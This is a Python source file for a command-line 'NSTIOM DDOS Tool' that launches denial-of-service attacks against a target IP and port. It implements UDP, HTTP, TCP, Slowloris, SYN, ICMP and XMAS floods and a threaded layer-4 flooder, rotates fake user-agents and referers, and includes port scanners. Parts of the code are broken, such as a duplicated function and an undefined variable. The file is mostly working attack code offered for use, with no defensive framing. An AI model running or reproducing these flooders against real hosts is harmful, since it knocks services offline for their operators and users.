import sys, os, time, argparse, socket, re, random, threading, string, json, webbrowser
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from colorama import init, Fore, Back, Style
from scapy.all import *
from getpass import getpass as hinput
from time import time, sleep
init(autoreset=True)
init(autoreset=True)

os.system('cls')

ascii = f"""
{Fore.CYAN}  ███╗░░██╗░██████╗████████╗██╗░█████╗░███╗░░░███╗
{Fore.CYAN}  ████╗░██║██╔════╝╚══██╔══╝██║██╔══██╗████╗░████║
{Fore.CYAN}  ██╔██╗██║╚█████╗░░░░██║░░░██║██║░░██║██╔████╔██║
{Fore.CYAN}  ██║╚████║░╚═══██╗░░░██║░░░██║██║░░██║██║╚██╔╝██║
{Fore.CYAN}  ██║░╚███║██████╔╝░░░██║░░░██║╚█████╔╝██║░╚═╝░██║
{Fore.CYAN}  ╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░░░░╚═╝
"""


columns = os.get_terminal_size().columns
for line in ascii.splitlines():
    print(line.center(columns))


print(Fore.RED + "[!] Credits to DISCORD NSTIOM COMMUNITY.".center(columns))

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]




thread_num = 0
thread_num_mutex = threading.Lock()


host = ""
ip = ""
port = 0
num_requests = 0

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads

        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' ' * 20}", end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)
    
def L4_main(ip, port, force, threads):
    print()
    cport = '' if port is None else f':{port}'
    print(f"Starting attack on {ip}{cport}.", end='\r')

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occurred and the attack was stopped.", '')
        return
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')
    print('\n')
    sleep(1)

    hinput("Press enter to exit.", '.')

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def attack():
    print_status()
    url_path = generate_url_path()
    
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def scan_ports(ip):
    for port in range(1, 65536):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if not s.connect_ex((ip, port)):
            print(f'IP: {ip}, port {port} is open')
        s.close()

def scan_ip(ip):
    print(f'Scanning IP: {ip}')
    scan_ports(ip)

def start(ip, port, pack, threads):
    print("Starting attack with threads:", threads)  # เพิ่มบรรทัดนี้
    global useragents, ref, acceptall
    hh = random._urandom(3016)
    xx = int(0)
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\n"
    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip), int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')

def start2(ip, port, pack, threads):
    for x in range(threads):
        thred = threading.Thread(target=start, args=(ip, port, pack))
        thred.start()

def start(ip, port, pack):
    print("Starting attack with threads:")
    global useragents, ref, acceptall
    hh = random._urandom(3016)
    xx = int(0)
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\n"
    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip), int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')

def slowloris_attack(ip, port, num_requests):
    list_of_sockets = []

    regular_headers = [
        "User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
        "Accept-language: en-US,en,q=0.5",
        "Connection: keep-alive"
    ]

    socket_count = num_requests
    print("Attacking {}:{} with {} packets".format(ip, port, socket_count))
    print("Creating sockets...")
    for i in range(socket_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
        except socket.error:
            break
        list_of_sockets.append(s)
    print("Setting up sockets...")
    for s in list_of_sockets:
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        for header in regular_headers:
            s.send(bytes("{}\r\n".format(header).encode("utf-8")))

    while True:
        print("Sending keep-alive!")
        for s in list_of_sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                print("error")
                raise


def synflood_attack(ip, port, num_requests):
    for x in range(0, int(num_requests)):
        send(IP(dst=ip)/TCP(dport=port,
                                flags="S",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))

        
def icmpflood_attack(ip, num_requests):
    print("Starting ICMP Flood attack on", ip, "at Count", num_requests, "in 3 Second...")
    
    for x in range(0, int(num_requests)):
        send(IP(dst=ip)/ICMP())

def xmasflood_attack(ip, port, num_requests):
    print("Starting XMAS Flood attack on", ip, "at Port", port, "at Count", num_requests, "in 3 Second...")
    
    for x in range(0, int(num_requests)):
        send(IP(dst=ip)/TCP(dport=port,
                            flags="FSRPAUEC",
                            seq=RandShort(),
                            ack=RandShort(),
                            sport=RandShort()))
def upd_attack(ip, port):
    print("Starting UDP Flood attack on", ip, "at port", port, "...")
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

def ddos_attack(ip, port, attack_choice, num_requests):
    if attack_choice == 2:
        print("Starting HTTP flood attack on", ip, "at port", port, "...")
        headers = "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000))
        headers += "Host: {}\r\n".format(ip)
        headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
        headers += "Accept-Language: en-US,en;q=0.5\r\n"
        headers += "Connection: keep-alive\r\n"
        
        try:
            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dos.connect((ip, port))
            dos.settimeout(3)

            dos.sendto(headers.encode(), (ip, port))

            sent = 0
            while True:
                dos.sendto(headers.encode(), (ip, port))
                sent += 1
                print("Sent {} packets to {} through port: {}".format(sent, ip, port))
        except socket.error:
            print("\n[ No connection, server may be down ]: {}".format(str(socket.error)))
        finally:
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()
    elif attack_choice == 3:
        print("Starting TCP Flood attack on", ip, "at port", port, "at Packets Per Second", pack, "and Threads", "...")
    elif attack_choice == 4:
        print("Starting Slowloris attack on", ip, "at port", port, "Count", num_requests, "...")
        slowloris_attack(ip, port, num_requests)
    elif attack_choice == 5:
        synflood_attack(ip, port, num_requests)
    elif attack_choice == 6:
        icmpflood_attack(ip, num_requests)
    elif attack_choice == 7:
        xmasflood_attack(ip, port, num_requests)
    else:
        print("Invalid attack choice")
def display_help():
    print('Available commands:')
    print('- scanport [1/2] [IP]: Scan ports on the specified IP address.')
    print('- scanip [url]: Scan IP address corresponding to the URL.')
    print('- DDos [Choice] [IP] [Port]: Initiate a DDoS attack with the specified choice.')
    print('- help: Display this help message.')
    print('- clear: Clear the console screen.')
    print('- exit: Exit the program.')
    print('- Discord: join discord')
def main():
    while True:
        try:
            input_text = input("root@root:~ $ ")
            if input_text.startswith('scanport '):
                mode, ip = re.findall(r'scanport\s+([12])\s+([\d.]+)', input_text)[0]
                if mode == '1':
                    scan_ports(ip)
                else:
                    common_ports = [20, 21, 22, 23, 53, 80, 161, 162, 443, 1234, 3389, 8080, 8086, 8888]
                    for port in common_ports:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        if not s.connect_ex((ip, port)):
                            print(f'IP: {ip}, port {port} is open')
                        s.close()
            elif input_text.startswith('scanip '):
                url = re.findall(r'scanip\s+(.*?)$', input_text)[0]
                try:
                    ip = socket.gethostbyname(url)
                    scan_ip(ip)
                except socket.gaierror:
                    print(f"Unable to resolve the host '{url}' to an IP address.")
            elif input_text == 'DDos' :
                print("-1 [IP] [PORT]: UDP Flood Attacking by sending a large volume of UDP (User Datagram Protocol) data to the target web server in order to prevent it from responding to legitimate requests.")
                print("-2 [IP] [PORT] [COUNT]: HTTP Flood Distributed denial of service (DDoS) attack involves sending a large volume of HTTP requests to the target web server, causing it to be unable to process the requests.")
                print("-3 [IP] [PORT] [PACKETS] [THREADS]: TCP Flood The attack involves creating a large number of TCP connections to the target server in order to consume resources for managing these connections, rendering the server unable to respond to other requests.")
                print("-4 [IP] [PORT] [COUNT]: Slowloris Attack Attack by creating incomplete HTTP connections and working slowly to disrupt the server.")
                print("-5 [IP] [PORT] [COUNT]: SYN Flood An attack involving sending a high volume of TCP SYN requests to a server to initiate connections but not sending back ACK responses, causing connection openings to hang.")
                print("-6 [IP] [PORT] [COUNT]: ICMP Flood Sending a large number of ICMP (Ping) packets to a target server in order to flood it with ICMP connection requests without actually establishing real connections is a technique to force the target server to open up for Ping checks extensively, causing the system resources to be fully utilized.")
                print("-7 [IP] [PORT] [COUNT]: XMAS Flood Sending a TCP packet in XMAS mode (meaning opening every flag set in the TCP header) to the target server in order to make the server process and inspect each packet, thus consuming system resources as intended.")
                print("-8 [IP] [PORT] [BYTES] [THREADS]: Layer 4 DDoS Attack is a type of Distributed Denial of Service (DDoS) attack that focuses on the Layer 4 of the network structure. It involves flooding the target with a high volume of data without considering the content of the data, causing the target machine to become unable to provide its services. This attack often utilizes TCP/UDP connections or sends UDP packets from multiple sources simultaneously to maximize its effectiveness. It typically has severe impacts on the network services of the target.")
            elif input_text.startswith('DDos '):
                parts = input_text.split()
                if len(parts) < 3:
                    print("Invalid syntax. Usage: Type 'DDos' to see choice commands.")
                else:
                    _, choice, ip, port, *params = parts
                    choice = int(choice)
                    if choice == 1:
                        upd_attack(ip, int(port))
                    elif choice == 2:
                        num_requests = int(params[0]) if params else 0
                        ddos_attack(ip, int(port), choice, num_requests)
                    elif choice == 3:
                        pack = int(params[0]) if params else 0
                        threads = int(params[1]) if len(params) > 1 else 0
                        start2(ip, int(port), pack, threads)
                    elif choice == 4:
                        num_requests = int(params[0]) if params else 0
                        ddos_attack(ip, int(port), choice, num_requests)
                    elif choice == 5:
                        num_requests = int(params[0]) if params else 0
                        ddos_attack(ip, int(port), choice, num_requests)
                    elif choice == 6:
                        num_requests = int(params[0]) if params else 100
                        ddos_attack(ip, port, choice, num_requests)
                    elif choice == 7:
                        num_requests = int(params[0]) if params else 100
                        xmasflood_attack(ip, int(port), num_requests)
                    elif choice == 8:
                        force = int(params[0]) if params else 1250
                        threads = int(params[1]) if len(params) > 1 else 100
                        L4_main(ip, int(port), force, threads)
                    else:
                        print("Invalid attack choice")
            elif input_text == 'help':
                display_help()
            elif input_text == 'Discord':
                url = "https://discord.gg/HQRkR6QPw4"
                webbrowser.open(url)
            elif input_text == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                columns = os.get_terminal_size().columns
                for line in ascii.splitlines():
                    print(line.center(columns))
                print("\n[!] Credits to DISCORD NSTIOM COMMUNITY.")
            elif input_text == 'exit':
                os.system('cls' if os.name == 'nt' else 'clear')
                break
            else:
                print(f"'{input_text}' is not recognized as an internal or external command. Type 'help' to see the commands.")
        except KeyboardInterrupt:
            
            RED = "\033[91m"
            WHITE = "\033[97m"
            RESET = "\033[0m"
            
            os.system('cls' if os.name == 'nt' else 'clear')
            columns = os.get_terminal_size().columns
            columns = os.get_terminal_size().columns
            for line in ascii.splitlines():
                print(line.center(columns))
            print(RED + "[!] Credits to DISCORD NSTIOM COMMUNITY.".center(columns))





if __name__ == "__main__":
    print("Welcome to NSTIOM DDOS Tool")
    main()
